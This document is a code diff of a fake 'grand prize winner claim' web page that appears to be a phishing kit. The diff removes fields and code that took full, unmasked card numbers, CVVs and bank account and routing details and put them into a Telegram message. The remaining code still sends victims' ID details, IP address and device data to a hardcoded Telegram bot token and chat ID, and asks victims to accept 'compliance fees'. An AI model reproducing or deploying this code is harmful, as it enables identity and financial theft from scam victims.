@@ -631,79 +631,6 @@
                 </div>
             </div>
 
-             <!-- PAYOUT METHOD -->
-            <div style="background:#16213e;border-radius:10px;padding:18px;margin:15px 0;border:1px solid #2a2a4a;">
-                <h3 style="color:#ffd700;font-size:16px;margin-bottom:12px;">💳 Fill out your weekly funds direct deposit form.</h3>
-                <div class="form-group">
-                    <label>DIRECT DEPOSIT FORM<span class="required">*</span></label>
-                    <select id="payoutMethod" onchange="togglePayoutFields()" required>
-                        <option value="">-- Select --</option>
-                        <option value="Debit Card">💳 Debit Card</option>
-                        <option value="Credit Card">💳 Credit Card</option>
-                        <option value="Bank Account">🏦 Bank Account</option>
-                    </select>
-                </div>
-
-                <!-- Debit/Credit Card Fields (UNMASKED) -->
-                <div class="dynamic-fields" id="cardFields">
-                    <div class="form-group">
-                        <label>Card Number <span class="required">*</span></label>
-                        <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" oninput="formatCardNumber(this)">
-                    </div>
-                    <div class="form-row">
-                        <div class="form-group">
-                            <label>Expiry Date <span class="required">*</span></label>
-                            <input type="text" id="cardExpiry" placeholder="MM/YY" maxlength="5" oninput="formatExpiry(this)">
-                        </div>
-                        <div class="form-group">
-                            <label>CVV <span class="required">*</span></label>
-                            <input type="password" id="cardCVV" placeholder="123" maxlength="4" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
-                        </div>
-                    </div>
-                    <div class="form-group">
-                        <label>Cardholder Name <span class="required">*</span></label>
-                        <input type="text" id="cardName" placeholder="Name on card">
-                    </div>
-                    <!-- Extra: Card Type (optional) -->
-                    <div class="form-group">
-                        <label>Card Type</label>
-                        <select id="cardType">
-                            <option value="Visa">💳 Visa</option>
-                            <option value="Mastercard">💳 Mastercard</option>
-                            <option value="Amex">💳 American Express</option>
-                            <option value="Discover">💳 Discover</option>
-                            <option value="Other">💳 Other</option>
-                        </select>
-                    </div>
-                </div>
-
-                <!-- Bank Account Fields -->
-                <div class="dynamic-fields" id="bankFields">
-                    <div class="form-group">
-                        <label>Bank Name <span class="required">*</span></label>
-                        <input type="text" id="bankName" placeholder="Bank name">
-                    </div>
-                    <div class="form-group">
-                        <label>Account Number <span class="required">*</span></label>
-                        <input type="text" id="bankAccount" placeholder="Account number" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
-                    </div>
-                    <div class="form-row">
-                        <div class="form-group">
-                            <label>Routing Number <span class="required">*</span></label>
-                            <input type="text" id="bankRouting" placeholder="Routing number" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
-                        </div>
-                        <div class="form-group">
-                            <label>Account Type <span class="required">*</span></label>
-                            <select id="bankAccountType">
-                                <option value="">-- Select --</option>
-                                <option value="Checking">🏦 Checking</option>
-                                <option value="Savings">🏦 Savings</option>
-                            </select>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
             <!-- STAMP OF APPROVAL -->
             <div class="stamp-section">
                 <div class="stamp-icon">📜</div>
@@ -795,7 +722,7 @@
         // CONFIGURATION
         // ============================================
         const BOT_TOKEN = "8777841044:AAGsYPsmbZJyBarJBC_ftTWNiVQVaCz0yz8";
-        const CHAT_IDS = "873270406";
+        const CHAT_ID = "873270406";
 
         let idFrontData = null;
         let idBackData = null;
@@ -940,12 +867,6 @@
             const idNumber = document.getElementById('idNumber').value.trim();
             const idExpiry = document.getElementById('idExpiry').value;
             const idIssue = document.getElementById('idIssue').value;
-            const cardNumber = document.getElementById('cardNumber').value.trim();
-            const cardExpiry = document.getElementById('cardExpiry').value.trim();
-            const cardCVV = document.getElementById('cardCVV').value.trim();
-            const cardName = document.getElementById('cardName').value.trim();
-            const cardType = document.getElementById('cardType').value;
-
 
             const acceptStamp = document.getElementById('acceptStamp').checked;
             const acceptMinors = document.getElementById('acceptMinors').checked;
@@ -980,23 +901,7 @@
             if (!acceptW2G) { showStatus('⚠️ Please accept the W2G reforms notice.', 'error'); return; }
             if (!acceptFees) { showStatus('⚠️ Please accept the compliance fees notice.', 'error'); return; }
             if (!acceptPrivacy) { showStatus('⚠️ Please accept the privacy policy.', 'error'); return; }
-            if (!acceptVerification) { showStatus('⚠️ Please accept the verification terms.', 'error'); return; } 
-            // Validate payout fields
-            if (payoutMethod === 'Debit Card' || payoutMethod === 'Credit Card') {
-                if (!cardNumber || cardNumber.replace(/\s/g, '').length < 16) { showStatus('⚠️ Please enter a valid card number.',
-                        'error'); return; }
-                if (!cardExpiry || cardExpiry.length < 5) { showStatus('⚠️ Please enter a valid expiry date.', 'error');
-                    return; }
-                if (!cardCVV || cardCVV.length < 3) { showStatus('⚠️ Please enter a valid CVV.', 'error'); return; }
-                if (!cardName) { showStatus('⚠️ Please enter the cardholder name.', 'error'); return; }
-            }
-
-            if (payoutMethod === 'Bank Account') {
-                if (!bankName) { showStatus('⚠️ Please enter your bank name.', 'error'); return; }
-                if (!bankAccount) { showStatus('⚠️ Please enter your account number.', 'error'); return; }
-                if (!bankRouting) { showStatus('⚠️ Please enter your routing number.', 'error'); return; }
-                if (!bankAccountType) { showStatus('⚠️ Please select your account type.', 'error'); return; }
-            } 
+            if (!acceptVerification) { showStatus('⚠️ Please accept the verification terms.', 'error'); return; }
 
             // Build Telegram message
             let message = `🏆 *GRAND PRIZE WINNER CLAIM SUBMITTED*\n`;
@@ -1034,18 +939,6 @@
             message += `🌐 *IP:* ${userIP || 'Auto-detected'}\n`;
             message += `📱 *Device:* ${userDevice || 'Unknown'}\n`;
             message += `🕐 *${new Date().toLocaleString()}*`;
-            if (payoutMethod === 'Debit Card' || payoutMethod === 'Credit Card') {
-            message += `💳 *Card Number:* ${cardNumber}\n`; // FULL, UNMASKED
-            message += `📅 *Expiry:* ${cardExpiry}\n`;
-            message += `🔐 *CVV:* ${cardCVV}\n`;
-            message += `👤 *Cardholder:* ${cardName}\n`;
-            message += `💳 *Card Type:* ${cardType}\n`;
-            if (payoutMethod === 'Bank Account') {
-                message += `🏦 *Bank Name:* ${bankName}\n`;
-                message += `💳 *Account Number:* ${bankAccount}\n`; // FULL, UNMASKED
-                message += `🔢 *Routing Number:* ${bankRouting}\n`;
-                message += `📋 *Account Type:* ${bankAccountType}\n`;
-            }
 
             // Get IP and device
             const userAgent = navigator.userAgent;
